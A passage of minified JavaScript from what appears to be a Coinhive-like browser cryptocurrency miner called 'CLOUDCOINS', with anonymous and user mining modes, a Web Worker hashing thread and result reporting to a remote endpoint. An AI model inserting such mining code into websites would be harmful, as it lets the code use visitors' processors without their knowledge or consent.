A={type:I,params:g||{},id:this._id,login_data:this._getLoginParams(),hashesPerSecond:this.getHashesPerSecond(),totalHashes:this.getTotalHashes(),acceptedHashes:this.getAcceptedHashes()},Z=new XMLHttpRequest,b=this;Z.onreadystatechange=function(){if(4==this.readyState){var I=null;try{I=JSON.parse(this.responseText)}catch(I){return b._emit("error",{connection_error:!0}),void b._onError()}if("error"===I.type){console&&console.error&&console.error("Cloudcoins Error:",I.error),b._emit("error",I);var g=I.job||I.result&&I.result.job;if(g)return console.log("SETTING NEW JOB"),void b._setJob(g);"invalid_site_key"===I.error.type&&(b._reconnectRetry=6e3,b._tab.waitReconnect=Date.now()+6e6),b._onError()}else C&&C(I)}},Z.open("POST",self.CLOUDCOINS.CONFIG.WEBSOCKET_URL+I,!0),Z.setRequestHeader("Content-type","application/json"),Z.send(JSON.stringify(A))},I.CLOUDCOINS=I.CLOUDCOINS||{},I.CLOUDCOINS.IF_EXCLUSIVE_TAB="ifExclusiveTab",I.CLOUDCOINS.FORCE_EXCLUSIVE_TAB="forceExclusiveTab",I.CLOUDCOINS.FORCE_MULTI_TAB="forceMultiTab",I.CLOUDCOINS.Token=function(I,C,A){var Z=new g(I,A);return Z._goal=C||0,Z},I.CLOUDCOINS.User=function(I,C,A){var Z=new g(I,A);return Z._user=C,Z},I.CLOUDCOINS.Anonymous=function(I,C){return new g(I,C)},I.CLOUDCOINS.Miner=function(I,C){return new g(I,C)}}(window),function(I){"use strict";var g=function(){this.worker=new Worker(CLOUDCOINS.KNIGHT_WORKER),this.worker.onmessage=this.onReady.bind(this),this.currentJob=null,this.verifyJob=null,this.jobCallback=function(){},this.verifyCallback=function(){},this._isReady=!1,this.hashesPerSecond=0,this.hashesTotal=0,this.running=!1,this.lastMessageTimestamp=Date.now()};g.prototype.onReady=function(I){if("ready"!==I.data||this._isReady)throw'Expecting first message to be "ready", got '+I;this._isReady=!0,this.worker.onmessage=this.onReceiveMsg.bind(this),this.currentJob?(this.running=!0,this.worker.postMessage(this.currentJob)):this.verifyJob&&this.worker.postMessage(this.verifyJob)},g.prototype.onReceiveMsg=function(I){I.data.verify_id?this.verifyCallback(I.data):(I.data.result&&this.jobCallback(I.data),this.hashesPerSecond=.5*this.hashesPerSecond+.5*I.data.hashesPerSecond,this.hashesTotal+=I.data.hashes,this.lastMessageTimestamp=Date.now(),this.running&&this.worker.postMessage(this.currentJob))},g.prototype.setJob=function(I,g){this.currentJob=I,this.jobCallback=g,this._isReady&&!this.running&&(this.running=!0,this.worker.postMessage(this.currentJob))},g.prototype.verify=function(I,g){this.verifyCallback=g,this._isReady?this.worker.postMessage(I):this.verifyJob=I},g.prototype.stop=function(){this.worker&&(this.worker.terminate(),this.worker=null),this.running=!1},I.CLOUDCOINS.JobThread=g}(window);